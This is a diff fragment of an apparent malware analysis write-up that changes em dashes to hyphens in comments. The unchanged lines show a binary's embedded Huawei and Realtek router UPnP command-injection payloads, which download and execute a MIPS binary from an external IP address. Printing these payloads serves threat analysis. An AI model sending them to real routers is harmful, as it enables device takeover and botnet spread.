@@ -116,7 +116,7 @@ Load average at probe: `5.19, 5.17, 5.11` on a likely-4-core ARM Xilinx Zynq Ult
 ELF64 statically-linked, 112,536 bytes. Strings reveal the **UPnP SOAP exploit module**:
 
 ```xml
-<!-- Huawei router exploit (CVE-2017-17215 class — WANPPPConnection NewStatusURL injection) -->
+<!-- Huawei router exploit (CVE-2017-17215 class - WANPPPConnection NewStatusURL injection) -->
 <u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>$(/bin/busybox wget -g 38.87.117.84 -l /tmp/binary -r /bins/Hilix.mips;
                   /bin/busybox chmod 777 * /tmp/binary;
@@ -124,7 +124,7 @@ ELF64 statically-linked, 112,536 bytes. Strings reveal the **UPnP SOAP exploit m
   <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
 </u:Upgrade>
 
-<!-- Realtek SDK router exploit (CVE-2014-8361 class — WANIPConnection NewInternalClient injection) -->
+<!-- Realtek SDK router exploit (CVE-2014-8361 class - WANIPConnection NewInternalClient injection) -->
 <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
   <NewInternalClient>`cd /var; rm -rf nig; wget http://38.87.117.84/bins/Hilix.mips -O nig;
                       chmod 777 nig; ./nig realtek`</NewInternalClient>
